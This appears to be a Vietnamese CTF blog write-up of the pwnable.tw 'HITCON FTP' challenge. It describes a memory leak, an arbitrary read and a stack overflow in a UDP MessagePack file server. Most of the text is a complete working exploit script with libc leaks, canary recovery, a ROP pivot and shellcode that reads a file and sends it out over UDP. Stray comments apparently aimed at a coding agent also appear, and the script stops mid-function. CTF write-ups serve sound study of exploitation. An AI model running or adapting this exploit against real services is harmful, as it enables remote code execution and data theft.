+++
title = 'Pwnable.tw - HITCON FTP'
date = 2026-10-12T12:05:00+07:00
draft = false
categories = ["pwn"]
series = ["Pwnable.tw"]
+++

## HITCON FTP

`chall.pwnable.tw:10309` (UDP)

### 1. Phân tích Binary

```js
pwndbg> checksec
File:       /home/lwd3c/Desktop/Pwn/pwnable.tw/HITCON FTP/hitcon_ftp
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
Stripped:   No
```

Đây là một FTP kiểu TFTP chạy trên UDP. Nội dung request được đóng gói bằng MessagePack; đường nhận DATA còn kiểm CRC32. Nhìn checksec thì không thể đơn giản ghi đè GOT hay nhảy shellcode trên stack. Mình cần leak địa chỉ trước, sau đó giữ nguyên canary khi sửa saved RIP.

#### Bug 1 - filename không có NUL kết thúc

`process_new()` chép tên file vào vùng dài `0x100` byte bằng `strncpy`. Nếu tên dài đúng `0x100`, chuỗi không có NUL kết thúc. Nhánh báo lỗi đưa tên vào `snprintf("file (%s) access violation", ...)`, khiến `%s` đọc tiếp qua con trỏ `FILE *` ở sau vùng tên. Những byte in ra cung cấp một heap pointer để lần theo request object.

Tên mình dùng là `b'A' * 253 + b'../'`: vừa đủ 256 byte, vừa chạm nhánh từ chối truy cập để server in thông báo lỗi. Nếu con trỏ tình cờ chứa NUL ở sáu byte thấp, leak bị cắt ngắn; script mở một kết nối UDP mới và thử lại.

#### Bug 2 - kiểm tra kiểu MessagePack thiếu một trường hợp

Trong `main`, kiểu của phần tử MessagePack thứ tư chỉ được kiểm tra khi mảng có **đúng bốn** phần tử. Với mảng năm phần tử, `process_new()` vẫn diễn giải vùng đó thành map. Gửi một `STR` cho phép mình dựng các cặp key/value giả, kể cả con trỏ tới key. `send_oack()` dùng `strlen(key)` và trả nội dung tại con trỏ đó về qua mạng.

#### Bug 3 - bound của `print_buffer` lấy từ packet

Trong đường xử lý DATA, `check_crc32()` in một MessagePack object vào buffer trên stack của `main`:

```c
// buf ở main_rbp - 0x224; canary cách đầu buf 0x20c byte
msgpack_object_print_buffer(buf, elem3.size + 1, elem3);
```

`elem3.size` do packet quyết định, không phải kích thước `buf`. Overflow chạy trước khi CRC được so sánh, nên mình có thể cố ý gửi CRC sai mà vẫn ghi được stack.

### 2. Khai thác

#### Leak libc, stack và canary

Mình chọn WRQ vì đường này mở `/dev/null`, dễ giữ request sống, và khi có option nó trả OACK. Thay con trỏ key rồi đọc các chuỗi ngắn liên tiếp tạo thành primitive đọc bộ nhớ. Chuỗi dừng ở NUL thì đọc tiếp từ byte kế sau.

UDP có thể trả gói trễ hoặc lặp. Lần đầu mình đọc nhầm một OACK cũ, làm hỏng mọi leak sau đó. Bản exploit cuối gắn một tag 16 bit vào option value rồi chỉ nhận OACK echo đúng tag. Khi `strlen` dừng sớm, mình biết byte kế là NUL và tiếp tục đọc từ địa chỉ sau nó.

Từ `FILE *` leak ở trên, đọc field vtable tại `FILE+0xd8`. Trừ offset `_IO_file_jumps` để ra libc base. Bản libc đi kèm ban đầu là 2.23, nhưng vtable trên server khớp glibc **2.27**. Mình còn đọc ELF magic và version string trong memory để xác nhận trước khi dùng offset libc 2.27.

Tiếp đó đọc `environ` để tìm stack. Quét quanh địa chỉ này đến khi gặp return address của `__libc_start_main`, từ đó định vị frame của `main`, đọc canary và địa chỉ PIE. Bước này quan trọng: sai libc một chút là mọi địa chỉ sau đều sai, còn sai canary thì overflow chết ngay.

Các offset dùng ở remote sau khi xác nhận glibc 2.27:

| Giá trị | Offset |
|---|---:|
| `_IO_file_jumps` | `0x3e82a0` |
| `environ` | `0x3ee098` |
| `mprotect` | `0x11bae0` |
| `leave; ret` trong PIE | `0x1883` |

#### Ghi lại frame của `main`

Một phần tử `STR` đủ dài ghi qua canary, saved RBP và saved RIP. Các vị trí tính từ đầu buffer:

| Trường | Offset |
|---|---:|
| canary | `0x20c` |
| saved RBX | `0x214` |
| saved R12 | `0x21c` |
| saved RBP | `0x224` |
| saved RIP | `0x22c` |

Khó ở chỗ `snprintf` luôn chèn một byte NUL tại cuối mỗi lần ghi. Nếu gửi một lần, các qword phía trước bị NUL làm hỏng. Cách mình dùng là gửi nhiều packet có **độ dài giảm dần**. Mỗi lần dài đặt trước các byte ở xa; lần ngắn sau sửa một byte NUL gần đầu mà không chạm lại phần cuối. Byte cao nhất của payload là NUL nên nó được dùng làm terminator của lần ghi đầu.

```py
D = bytearray(payload)
zeros = sorted((i for i in range(1, len(D)) if D[i] == 0), reverse=True)
for L in zeros:
    body = bytes(0x41 if b == 0 else b for b in D[1:L]) + b'\xff'
    do_write(conn, L, body)  # snprintf đặt NUL tại offset L
```

Sau chuỗi packet này, canary trên stack có lại giá trị thật, saved RBP trỏ tới `datain`, saved RIP thành `leave; ret` trong PIE.

#### ORW qua UDP

ROP chain cùng shellcode được đặt trong vùng `datain`; stack pivot đưa luồng chạy tới đó. Chain gọi `mprotect` trên page chứa shellcode, rồi shellcode thực hiện `open("/home/hitcon_ftp/flag")`, `read` và `sendto` về UDP socket. Script tiếp tục gửi gói chứa chain tới khi `alarm(60)` làm hàm hiện tại thoát và `ret` chạm payload.

```text
EXFIL: FLAG{c4ptur3_th3_f0rtun3_by_h1tc0n_ftp}
```

`FLAG: FLAG{c4ptur3_th3_f0rtun3_by_h1tc0n_ftp}`

File `sandbox/flag` ở local chỉ là placeholder. Flag trên là nội dung script nhận từ server qua UDP, không phải dữ liệu trong bản thử local.

### Full exploit

`exploit.py` đã dùng cho bài này:

```py
#!/usr/bin/env python3
# EDIT THIS FILE IN PLACE with the Edit tool. Never re-emit it as a heredoc. Never create exploit2.py.
from pwn import *
import os, re, socket, struct, time, zlib

exe = ELF('/home/lwd3c/Desktop/Pwn/pwnable.tw/HITCON FTP/hitcon_ftp', checksec=False)

context.binary = exe
context.os = 'linux'
context.arch = 'amd64'
context.endian = 'little'
# context.log_level = 'debug'

HOST, PORT = "chall.pwnable.tw", "10309"

# ---- measured-number ledger: every address/offset used below goes through this ----
def fact(name, value, cmd):
    """record a MEASURED value in ./facts.tsv via 'p fact set'.
       These are per-run ASLR leaks: the command that produced them is this very
       script against a live process, so they can never be re-executed later ->
       recorded as attested, with the leak path named in --src."""
    import subprocess
    v = value if isinstance(value, str) else (hex(value) if isinstance(value, int) else str(value))
    subprocess.run(["p", "fact", "set", f"{name}={v}", "--src", cmd,
                    "--attest", "per-run ASLR leak read out of the live target by this exploit; "
                                "no later command can reproduce it (the process is gone)"],
                   check=False, stdout=subprocess.DEVNULL)
    return value

# =========================== msgpack (minimal) ===============================
def mp_uint(v):
    if v < 0x80:                return bytes([v])
    if v <= 0xff:               return b'\xcc' + struct.pack('>B', v)
    if v <= 0xffff:             return b'\xcd' + struct.pack('>H', v)
    if v <= 0xffffffff:         return b'\xce' + struct.pack('>I', v)
    return b'\xcf' + struct.pack('>Q', v)

def mp_str(b):
    if isinstance(b, str): b = b.encode()
    n = len(b)
    if n < 32:                  return bytes([0xa0 | n]) + b
    if n <= 0xff:               return b'\xd9' + struct.pack('>B', n) + b
    if n <= 0xffff:             return b'\xda' + struct.pack('>H', n) + b
    return b'\xdb' + struct.pack('>I', n) + b

def mp_bin(b):
    n = len(b)
    if n <= 0xff:               return b'\xc4' + struct.pack('>B', n) + b
    if n <= 0xffff:             return b'\xc5' + struct.pack('>H', n) + b
    return b'\xc6' + struct.pack('>I', n) + b

def mp_arr(items):
    n = len(items)
    hdr = bytes([0x90 | n]) if n < 16 else (b'\xdc' + struct.pack('>H', n))
    return hdr + b''.join(items)

def mp_map(pairs):
    n = len(pairs)
    hdr = bytes([0x80 | n]) if n < 16 else (b'\xde' + struct.pack('>H', n))
    return hdr + b''.join(k + v for k, v in pairs)

class MP:
    """just enough decoder for the server's replies"""
    def __init__(self, b): self.b, self.i = b, 0
    def u8(self):
        v = self.b[self.i]; self.i += 1; return v
    def raw(self, n):
        v = self.b[self.i:self.i+n]; self.i += n; return v
    def val(self):
        t = self.u8()
        if t < 0x80:                        return t
        if 0x80 <= t <= 0x8f:               return {self.val(): self.val() for _ in range(t & 0xf)}
        if 0x90 <= t <= 0x9f:               return [self.val() for _ in range(t & 0xf)]
        if 0xa0 <= t <= 0xbf:               return self.raw(t & 0x1f)
        if t == 0xc0:                       return None
        if t == 0xc2:                       return False
        if t == 0xc3:                       return True
        if t == 0xc4:                       return self.raw(self.u8())
        if t == 0xc5:                       return self.raw(struct.unpack('>H', self.raw(2))[0])
        if t == 0xc6:                       return self.raw(struct.unpack('>I', self.raw(4))[0])
        if t == 0xcc:                       return self.u8()
        if t == 0xcd:                       return struct.unpack('>H', self.raw(2))[0]
        if t == 0xce:                       return struct.unpack('>I', self.raw(4))[0]
        if t == 0xcf:                       return struct.unpack('>Q', self.raw(8))[0]
        if t == 0xd9:                       return self.raw(self.u8())
        if t == 0xda:                       return self.raw(struct.unpack('>H', self.raw(2))[0])
        if t == 0xdb:                       return self.raw(struct.unpack('>I', self.raw(4))[0])
        if t == 0xdc:                       return [self.val() for _ in range(struct.unpack('>H', self.raw(2))[0])]
        if t == 0xde:
            n = struct.unpack('>H', self.raw(2))[0]
            return {self.val(): self.val() for _ in range(n)}
        if t == 0xdf:
            n = struct.unpack('>I', self.raw(4))[0]
            return {self.val(): self.val() for _ in range(n)}
        raise ValueError("unhandled msgpack type 0x%02x" % t)

def mp_decode(b):
    return MP(b).val()

# ============================ crc32 (binary's own) ===========================
# send_data/check_crc32 both run the standard reflected CRC-32 (poly 0xEDB88320)
# over bytes[1:], seed 0xffffffff, final xor 0xffffffff  ==  zlib.crc32(bytes[1:])
def crc_of(buf):
    return zlib.crc32(buf[1:]) & 0xffffffff

# ============================== UDP connection ===============================
class Target:
    """chall.pwnable.tw:10309 is a TCP *dispatcher*: it spawns a private instance of
       the UDP server and answers 'start challenge on udp port: NNNNN'. The control
       socket is kept open for the life of the instance."""
    def __init__(self, remote_mode):
        self.ctl = None
        if remote_mode:
            # bound the CONNECT: chall.pwnable.tw silently drops SYNs when its
            # per-IP token bucket is drained, so an unbounded connect sits in
            # SYN retransmission for tens of minutes.
            self.host = HOST
            t_c = time.time()
            self.ctl = socket.create_connection((HOST, 10309), 8.0)
            if time.time() - t_c > 15:
                log.warning(f"connect took {time.time() - t_c:.1f}s -- easing off")
            self.ctl.settimeout(10)
            banner = b''
            while b'\n' not in banner:
                chunk = self.ctl.recv(256)
                if not chunk: raise EOFError('dispatcher closed')
                banner += chunk
            m = re.search(rb'udp port:\s*(\d+)', banner)
            if not m: raise ValueError('unexpected banner %r' % banner)
            self.port = int(m.group(1))
            log.success(f"instance udp port {self.port}  (banner {banner!r})")
        else:
            self.host = '127.0.0.1'
            self.port = int(os.environ.get('LPORT', '31337'))

    def conn(self, timeout=2.0):
        return Conn(self.host, self.port, timeout)

    def close(self):
        if self.ctl:
            try: self.ctl.close()
            except Exception: pass


class Conn:
    """one UDP source port == one server-side `request` slot (find_request keys on ip:port)"""
    def __init__(self, host, port, timeout=2.0):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.s.settimeout(timeout)
        self.s.connect((host, int(port)))
        self.block = 0
        self.seq = 0x4000     # read_at tags live above every scan_for tag

    def send(self, pkt):
        self.s.send(pkt)

    def recv(self, timeout=None):
        if timeout is not None: self.s.settimeout(timeout)
        try:
            return self.s.recv(0x20000)
        except socket.timeout:
            return None

    def xchg(self, pkt, timeout=None):
        self.send(pkt)
        r = self.recv(timeout)
        return mp_decode(r) if r else None

    def drain(self, timeout=0.05):
        out = []
        while True:
            r = self.recv(timeout)
            if r is None: break
            out.append(mp_decode(r))
        return out

    def close(self):
        try: self.s.close()
        except Exception: pass

# ----------------------------- packet builders -------------------------------
def pkt_req(op, filename, mode=b'octet', opts=None, extra_elems=None, tail=b''):
    items = [mp_uint(op), mp_str(filename), mp_str(mode)]
    if opts is not None:
        items.append(opts)
    if extra_elems:
        items += extra_elems
    return mp_arr(items) + tail

def pkt_data(block, payload, as_bin=False, crc=None, tail=b''):
    body = mp_bin(payload) if as_bin else mp_str(payload)
    if crc is None: crc = 0
    return mp_arr([mp_uint(3), mp_uint(block), mp_uint(crc), body]) + tail

def pkt_ack(block):
    return mp_arr([mp_uint(4), mp_uint(block)])

def pkt_err(code, msg):
    return mp_arr([mp_uint(5), mp_uint(code), mp_str(msg)])

# ===================== primitive 1: arbitrary read -> OACK ===================
# main() only validates elem3.type == MAP when the array has exactly 4 elements.
# With 5 elements process_new() still does  v17 = (u32)a3[10];  v18 = a3[11];
# so a STR elem3 makes v18 point at raw packet bytes we control and every
# 48-byte msgpack_object_kv is forged, INCLUDING key.via.str.ptr.
# WRQ is used because it fopen()s "/dev/null" and therefore always succeeds,
# and because opt_cnt != 0 makes process_new() answer with send_oack(), which
# packs strlen(key) bytes of whatever we pointed at.
def kv_entry(ptr, ln, val=0x4141):
    e  = b'\x02\x00\x00\x00' + b'\x00' * 4          # +0  key.type = STR(5) is supplied by D[0..3]
    return e                                          # (unused; see build_read below)

def build_read(ptrs, filename=b'x', op=2, tag=0x4141):
    """one WRQ packet that makes the server strncpy() up to 63 bytes from each ptr
       and echo them back as OACK map keys.  len(ptrs) must be <= 8 (opt_cnt<=7)."""
    n = len(ptrs)
    # elem3 = STR of size n  -> loop runs n times, reads n*48 bytes starting at D
    # D[0..n-1] are the str payload, everything after is elem4 + trailing bytes.
    body = bytearray()
    for i, (ptr, ln) in enumerate(ptrs):
        kv = bytearray(48)
        kv[0:4]   = p32(5)              # key.type   = MSGPACK_OBJECT_STR
        kv[8:12]  = p32(ln)             # key.via.str.size   (must be <= 0x3f)
        kv[16:24] = p64(ptr)            # key.via.str.ptr    <-- arbitrary
        kv[24:28] = p32(2)              # val.type   = POSITIVE_INTEGER
        kv[32:40] = p64(tag)            # val.via.u64 -> echoed back as the map value
        body += kv
    # the first n bytes of `body` are consumed as the STR payload itself, and the
    # byte right after them is elem4's encoding, so both must come out right:
    #   body[0] = 0x05 -> D[0];  elem4 = positive fixint 0 -> D[n]
    # therefore we place the kv array so that D[0..3] == 05 00 00 00.
    assert n == 1, "only the 1-entry form keeps D[0..3] == 05 00 00 00"
    strpayload = b'\x05'
    elem4      = b'\x00'                # positive fixint 0 -> supplies D[1] = 0x00
    tail       = bytes(body[2:])        # D[2:] are trailing packet bytes
    return mp_arr([mp_uint(op), mp_str(filename), mp_str(b'octet'),
                   mp_str(strpayload), elem4]) + tail

def oack_keys(reply):
    if not (isinstance(reply, list) and len(reply) == 2 and reply[0] == 6):
        return None
    return list(reply[1].keys())

def read_at(c, addr, ln=0x3f, filename=b'x', tries=3):
    """bytes at addr up to the first NUL (max ln), or None.

       Every request carries a unique 16-bit tag in the option's VALUE, which the
       OACK echoes back. Replies are drained until the tag matches, so a late or
       duplicated datagram can never shift all subsequent reads by one - which is
       exactly what silently corrupted the first remote run."""
    for _ in range(tries):
        c.seq = (c.seq + 1) & 0xffff
        tag = c.seq
        c.send(build_read([(addr, ln)], filename=filename, tag=tag))
        for _ in range(12):
            r = c.recv(1.2)
            if r is None:
                break
            try:
                rep = mp_decode(r)
            except Exception:
                continue
            if not (isinstance(rep, list) and len(rep) == 2 and rep[0] == 6):
                continue
            for k, v in rep[1].items():
                if k in (b'tsize', b'blksize', b'timeout'):
                    continue
                if v == tag:
                    return k
            # an OACK with a different tag is a stale reply: keep draining
    return None

def read_mem(c, addr, n):
    """exact n bytes: a short answer means the byte that stopped strlen() was 0x00"""
    out = bytearray()
    while len(out) < n:
        want = min(0x3f, n - len(out))
        chunk = read_at(c, addr + len(out), want)
        if chunk is None:
            return None
        out += chunk
        if len(chunk) < want:
            out += b'\x00'
    return bytes(out[:n])

def read_ptr(c, addr):
    v = read_mem(c, addr, 8)
    return None if v is None else u64(v)

def scan_for(c, addrs, want, ln=6, window=2.5):
    """pipelined search: fire one read packet per candidate, then match the OACK
       replies by the 16-bit tag we smuggled in as the option's value. One RTT
       instead of len(addrs) RTTs -- the 60s alarm leaves no room for the latter."""
    for i, a in enumerate(addrs):
        c.send(build_read([(a, ln)], tag=i & 0xffff))
        time.sleep(0.0015)
    hit, seen = None, 0
    t_end = time.time() + window
    while time.time() < t_end:
        r = c.recv(0.25)
        if r is None:
            continue
        try:
            rep = mp_decode(r)
        except Exception:
            continue
        if not (isinstance(rep, list) and len(rep) == 2 and rep[0] == 6):
            continue
        seen += 1
        for k, v in rep[1].items():
            if k in (b'tsize', b'blksize', b'timeout'):
                continue
            if k == want and v < len(addrs):
                hit = addrs[v]
    c.drain(0.4)              # never leave a stale OACK behind
    c.seq = 0x4000
    return hit, seen


# ============== primitive 2: heap leak (FILE* out of the error text) =========
# process_new(): memset(a1+16,0,0x100); strncpy(a1+16, name, n<=0x100)
# n == 0x100 leaves request+16 WITHOUT a terminator, and request+272 is the FILE*,
# so the "../"-trap path's snprintf(a1+320,0x200,"file (%s) access violation")
# walks straight off the name and into the pointer.
def leak_file_ptr(c):
    name = b'A' * 253 + b'../'          # 256 bytes, trips strnstr, no NUL left
    assert len(name) == 0x100
    r = c.xchg(pkt_req(1, name))
    if not (isinstance(r, list) and len(r) == 3 and r[0] == 5):
        return None, r
    msg = r[2]
    m = re.match(rb'^file \(' + re.escape(name) + rb'(.*?)\) access violation$', msg, re.S)
    if not m:
        return None, msg
    spill = m.group(1)
    if len(spill) != 6:
        return None, spill          # a 0x00 inside the pointer truncated %s
    fp = u64(spill + b'\x00\x00')
    if fp & 0xf or fp < 0x10000:
        return None, spill
    return fp, spill


# ========== primitive 3: stack write via check_crc32 -> print_buffer =========
# check_crc32(buf = main's rbp-0x224, crc, elem3) calls
#   msgpack_object_print_buffer(buf, elem3.size + 1, elem3)
# i.e. the bound comes from the PACKET, not from the 0x20c bytes of room that
# actually exist in front of main's canary.  For a STR elem3 the writer is
#   snprintf(buf, L+1, "\"") ; snprintf(buf+1, L, "%.*s", L, data)
# so exactly L+1 bytes land: buf[0]='"', buf[1..L-1]=data, buf[L]=0x00.
# One NUL per packet, always the LAST byte -> emit the payload as a sequence of
# writes with STRICTLY DECREASING length, one per 0x00 in the payload. A shorter
# write never disturbs what a longer earlier one put above its own terminator.
BUF_OFF   = 0x224          # buf == main_rbp - 0x224
I_CANARY  = 0x224 - 0x18   # 0x20c
I_RBX     = 0x224 - 0x10
I_R12     = 0x224 - 0x08
I_RBP     = 0x224          # main epilogue: lea -0x10(rbp),rsp; pop rbx; pop r12; pop rbp; ret
I_RET     = 0x22c
FILLER    = 0x41

def encode_writes(payload_at):
    """payload_at: {index -> byte}. returns [(length, data_bytes)] in send order."""
    M = max(payload_at)
    D = bytearray(FILLER for _ in range(M + 1))
    for i, b in payload_at.items():
        D[i] = b
    assert D[M] == 0, "top byte of the payload must be 0x00 (it is a write terminator)"
    zeros = sorted([i for i in range(1, M + 1) if D[i] == 0], reverse=True)
    writes = []
    for L in zeros:
        body = bytearray(D[1:L])                      # lands at indices 1..L-1
        for j in range(len(body)):
            if body[j] == 0:
                body[j] = FILLER                      # a later, shorter write fixes it
        # elem3.size must be exactly L so that print_buffer's bound is L+1;
        # the final byte is never copied out (snprintf truncates) -> padding.
        writes.append((L, bytes(body) + b'\xff'))
    return writes

def do_write(c, length, data, blksize=0xffb8):
    """one (WRQ re-arm, DATA) pair: the crc always fails, which is fine -- the
       overflow already happened inside check_crc32 before the comparison."""
    assert len(data) == length and b'\x00' not in data
    opts = mp_map([(mp_str(b'blksize'), mp_uint(blksize))])
    r1 = c.xchg(pkt_req(2, b'x', opts=opts))
    if not (isinstance(r1, list) and r1[0] == 6):
        return False, r1
    r2 = c.xchg(pkt_data(1, data, as_bin=False, crc=0xdeadbeef, tail=b'\xff' * 16))
    return True, r2


# ---- result gate (AGENTS.md rule 4): there is no shell here, the endgame is a
# file read under a seccomp ORW allowlist, so the proof is a COMPLETE FLAG{...}
# (closing brace included) in bytes the exploit pulled off the real target.
def verify(out, expect=rb'FLAG\{[^}]+\}'):
    """True only if `out` holds a complete flag. A bare prefix, a truncated
       transfer or a short recv is NOT a result."""
    if not out:
        log.failure("verify: nothing came back")
        return False
    m = re.search(expect, out)
    if not m:
        log.failure(f"verify: no complete match for {expect!r} in {out[:120]!r}")
        return False
    if b'localflag{' in out:
        log.failure("verify: that is the local placeholder, not the challenge flag")
        return False
    log.success(f"verify: {m.group(0).decode()}")
    return True


# ============================== exploit stages ===============================
FLAGPATH = b'/home/hitcon_ftp/flag'

# ---- everything below was MEASURED, never recalled -------------------------
# libc: Ubuntu GLIBC 2.27-3ubuntu1 (identified from the remote FILE vtable:
#       0x7fc6aa1fa2a0 - 0x3e82a0 == 0x7fc6a9e12000, page aligned) and then
#       confirmed in-band by the ELF magic + version string.
L_VTABLE   = 0x3e82a0     # ELF('libc227.so.6').sym._IO_file_jumps
L_ENVIRON  = 0x3ee098     # ELF('libc227.so.6').sym.environ
L_VERSTR   = 0x1bb800     # offset of "GNU C Library (Ubuntu GLIBC 2.27..."
L_MAINRET  = 0x21b97      # insn after `call *%rax` in __libc_start_main (objdump)
L_MPROTECT = 0x11bae0     # ELF('libc227.so.6').sym.mprotect
L_POP_RDI  = 0x2155f
L_POP_RSI  = 0x23e6a
L_POP_RDX  = 0x1b96
# binary (PIE), from objdump: 0x1883 == c9 c3 (leave ; ret)
B_LEAVE_RET = 0x1883
B_INIT_REQS = 0x20d060    # nm hitcon_ftp
B_DATAIN    = 0x20d370
B_CSU_INIT  = 0x9f00      # main's saved rbp == &__libc_csu_init
MAIN_RBP_DELTA = 0x100    # env_val - main_rbp, refined by the scan anyway

def build_chain(libc, pie, datain, sockaddr_ptr, flagpath):
    """the packet body that becomes `datain`; main's smashed frame pivots rsp here"""
    SC, PATH, BUF = 0x100, 0x300, 0x400
    sc = asm(f'''
        mov rdi, {datain + PATH}
        xor esi, esi
        xor edx, edx
        mov eax, 2                 /* open */
        syscall
        mov [{datain + BUF}], rax  /* keep the open() result visible */
        mov edi, eax
        mov rsi, {datain + BUF + 8}
        mov edx, 0xf0
        xor eax, eax               /* read */
        syscall
        mov rdi, 0                 /* fd 0 == the bound udp socket */
        mov rsi, {datain + BUF}
        mov edx, 0x100
        xor r10d, r10d
        mov r8, {sockaddr_ptr}
        mov r9d, 16
        mov eax, 44                /* sendto */
        syscall
        mov rdi, 0
        mov rsi, {datain + BUF}
        mov edx, 0x100
        xor r10d, r10d
        mov r8, {sockaddr_ptr}
        mov r9d, 16
        mov eax, 44
        syscall
        mov edi, 0
        mov eax, 231               /* exit_group */
        syscall
    ''')
    rop = [
        libc + L_POP_RDI,          # pop rdi ; ret
        datain & ~0xfff,
        libc + L_POP_RSI,          # pop rsi ; ret
        0x1000,
        libc + L_POP_RDX,          # pop rdx ; ret
        7,
        libc + L_MPROTECT,         # mprotect
        datain + SC,
    ]
    pkt = bytearray(b'\xc1' + b'\x41' * 7)      # 0xc1 => msgpack parse error, body ignored
    pkt += b''.join(p64(x) for x in rop)
    pkt = pkt.ljust(SC, b'\x90') + sc
    pkt = pkt.ljust(PATH, b'\x00') + flagpath + b'\x00'
    pkt = pkt.ljust(BUF + 0x100, b'\x00')
    return bytes(pkt)

def pwn(t, flagpath, log_only=False):
    global T0
    T0 = time.time()
    c = t.conn(timeout=3.0)
    opts = mp_map([(mp_str(b'blksize'), mp_uint(0xffb8))])

    # ---- 0/1. create a request (fopen "/dev/null") and spill its FILE*.
    # A 0x00 anywhere in the low 6 bytes truncates the %s, so fall back to a
    # fresh source port: that allocates another request + FILE and moves it.
    filep = spill = None
    for attempt in range(6):
        r = c.xchg(pkt_req(2, b'x', opts=opts))
        if not (isinstance(r, list) and r[0] == 6):
            log.warning(f"WRQ warm-up {attempt}: {r}")
        else:
            filep, spill = leak_file_ptr(c)
            if filep is not None:
                break
            log.warning(f"FILE* spill attempt {attempt} unusable: {spill!r}")
        c.close()
        c = t.conn(timeout=3.0)
    if filep is None:
        log.error(f"FILE* leak failed: {spill!r}")
    fact("filep", filep, "exploit.py: leak_file_ptr() - snprintf %s past the unterminated request+16")
    log.success(f"FILE*      = {hex(filep)}")

    # ---- 2. libc: fopen()'s vtable is &_IO_file_jumps ----------------------
    vt = read_ptr(c, filep + 0xd8)
    if vt is None:
        log.error("vtable read failed")
    log.info(f"FILE+0xd8  = {hex(vt)}  (expect page offset 0x6e0 for 2.23-0ubuntu5)")
    libc = vt - L_VTABLE
    if libc & 0xfff:
        log.error(f"vtable {hex(vt)} does not look like _IO_file_jumps (libc {hex(libc)})")
    magic = read_at(c, libc, 8)
    ver = read_at(c, libc + L_VERSTR, 0x3f)
    log.info(f"libc magic {magic!r}  ver {ver!r}")
    if magic != b'\x7fELF\x02\x01\x01\x03':
        log.error("libc base wrong (no ELF magic)")
    if not ver or not ver.startswith(b'GNU C Library (Ubuntu GLIBC 2.27'):
        log.error(f"unexpected libc: {ver!r} -- offsets below were measured on 2.27-3ubuntu1")
    fact("libc_base", libc, f"exploit.py: read_ptr(FILE*+0xd8) - {hex(L_VTABLE)} (_IO_file_jumps), ELF magic + version string verified")
    log.success(f"libc       = {hex(libc)}")

    # ---- 3. stack: libc's environ, then hunt main's return address ---------
    env = read_ptr(c, libc + L_ENVIRON)
    log.success(f"environ    = {hex(env)}")
    # main's return address inside __libc_start_main (the insn after `call *%rax`)
    want = p64(libc + L_MAINRET)[:6]
    base = env - MAIN_RBP_DELTA + 8               # the argc==2 guess, probed first
    hit = None
    for span in (0x200, 0x600):
        cands = [base] + [base + d for d in
                          sorted(range(-span, span + 8, 8), key=abs) if d]
        hit, seen = scan_for(c, cands, want)
        log.info(f"main-frame scan +-{hex(span)}: {len(cands)} probes, {seen} replies, "
                 f"hit {hex(hit) if hit else None}")
        if hit:
            break
    if hit is None:
        log.error("could not locate main's frame on the stack")
    main_rbp = hit - 8
    fact("main_rbp", main_rbp, f"exploit.py: pipelined scan near libc!environ for main's return address (libc+{hex(L_MAINRET)})")
    log.success(f"main_rbp   = {hex(main_rbp)}")

    # ---- 4. canary (its low byte is always 0x00) and the PIE base ----------
    hi = read_mem(c, main_rbp - 0x18 + 1, 7)
    canary = u64(b'\x00' + hi)
    fact("canary", canary, "exploit.py: read_mem(main_rbp-0x17, 7); low byte is 0 by construction in glibc")
    log.success(f"canary     = {hex(canary)}")
    srbp = read_ptr(c, main_rbp)
    pie = srbp - B_CSU_INIT
    if pie & 0xfff:
        log.error(f"saved rbp {hex(srbp)} is not __libc_csu_init")
    fact("pie_base", pie, "exploit.py: read_ptr(main_rbp) - 0x9f00 (main's saved rbp == &__libc_csu_init)")
    log.success(f"pie        = {hex(pie)}")

    # ---- 5. the two heap globals we need ----------------------------------
    datain = read_ptr(c, pie + B_DATAIN)
    req0 = read_ptr(c, pie + B_INIT_REQS)
    # the option loop runs BEFORE process_new's strcpy(a1+16,"/dev/null"), so
    # request+16 still holds the filename of this very packet -> use a tag.
    name = read_at(c, req0 + 16, 0x3f, filename=b'REQ0CHECK')
    log.info(f"datain {hex(datain)}  init_reqs[0] {hex(req0)}  name {name!r}")
    if name != b'REQ0CHECK':
        log.error("init_reqs[0] does not look like our request")
    fact("datain", datain, "exploit.py: read_ptr(pie+B_DATAIN)")
    fact("req0", req0, "exploit.py: read_ptr(pie+B_INIT_REQS), verified by request+16 == the tag filename")

    # ---- 6. the pivot payload over main's saved registers / return address -
    chain = build_chain(libc, pie, datain, req0 + 296, flagpath)
    pay = {}
    for i, b in enumerate(p64(canary)):              pay[I_CANARY + i] = b
    for i in range(16):                              pay[I_RBX + i] = FILLER
    for i, b in enumerate(p64(datain)):              pay[I_RBP + i] = b
    for i, b in enumerate(p64(pie + B_LEAVE_RET)):        pay[I_RET + i] = b   # leave ; ret
    writes = encode_writes(pay)
    log.info(f"stack payload: {len(writes)} writes, lengths {[w[0] for w in writes]}")
    for L, data in writes:
        ok, rr = do_write(c, L, data)
        if not ok:
            log.error(f"write L={L} failed to re-arm: {rr}")
    log.success(f"stack frame rewritten [t+{time.time() - T0:.1f}s]")

    # ---- 7. park the ROP chain + shellcode in datain and wait for SIGALRM --
    log.info(f"spamming the pivot packet ({len(chain)} bytes) until alarm(60) fires "
             f"[t+{time.time() - T0:.1f}s]")
    deadline = time.time() + 80
    out = b''
    while time.time() < deadline:
        try:
            c.send(chain)
        except Exception as e:
            log.warning(f"send: {e}")
            break
        r = c.recv(0.4)
        if r and len(r) >= 0x100:
            out = r
            break
    log.info(f"got {len(out)} bytes back [t+{time.time() - T0:.1f}s]")
    c.close()
    return out

def main():
    t = Target(bool(args.REMOTE))
    log.info(f"target {t.host}:{t.port}")

    stage = args.STAGE or 'probe'

    if stage == 'probe':
        # cheapest possible win: is the flag reachable with no traversal at all?
        c = t.conn()
        for fn in (b'flag', b'home/hitcon_ftp/flag', b'hitcon_ftp/flag',
                   b'./flag', b'tmp/flag'):
            r = c.xchg(pkt_req(1, fn, opts=mp_map([(mp_str(b'blksize'), mp_uint(1024))])))
            log.info(f"RRQ {fn!r} -> {str(r)[:160]}")
            if isinstance(r, list) and r[0] == 6:
                r2 = c.xchg(pkt_ack(0))
                log.success(f"  DATA -> {str(r2)[:300]}")
        c.close()

    elif stage == 'leak':
        c = t.conn()
        log.info(f"WRQ warm-up -> {c.xchg(pkt_req(2, b'x'))}")
        fp, spill = leak_file_ptr(c)
        log.info(f"FILE* spill={spill!r} -> {fp if fp is None else hex(fp)}")
        c.close()

    elif stage == 'read':
        addr = int(args.ADDR, 0)
        c = t.conn()
        c.xchg(pkt_req(2, b'x'))
        out = read_at(c, addr)
        log.info(f"read_at({hex(addr)}) = {out!r}")
        c.close()

    elif stage == 'pwn':
        flagpath = FLAGPATH if args.REMOTE else (
            os.path.join(os.path.dirname(os.path.abspath(__file__)), 'sandbox', 'flag').encode())
        out = pwn(t, flagpath)
